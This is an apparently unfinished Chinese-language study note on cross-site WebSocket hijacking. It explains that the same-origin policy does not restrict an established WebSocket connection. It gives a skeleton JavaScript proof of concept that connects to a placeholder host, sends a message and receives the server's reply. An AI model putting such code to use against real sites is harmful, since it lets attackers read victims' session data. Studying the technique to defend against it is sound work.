## WebSocket
先写一个大概。。。。

一种协议，

劫持：由于SOP在此时不起作用，在建立websocket连接之后，就可以使用异域的脚本读取/接收服务器的数据；

```js
<meta charset="utf-8">
<script>
function ws_attack(){//自定义函数ws_attack
    //定义函数功能
    //创建WebSocket并赋值给ws变量
	var ws = new WebSocket("ws://域名:端口/");//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://
	ws.onopen = function(evt) { 
        //当ws(WebSocket)处于连接状态时执行
		ws.send("ah ah ah ah！");
	};
	ws.onmessage = function(evt) {
        //当ws(WebSocket)请求有响应信息时执行
        //注意：响应的信息可以通过evt.data获取！例如：alert(evt.data);
		ws.close();
	};
}
ws_attack();//执行ws_attact函数
</script>
```
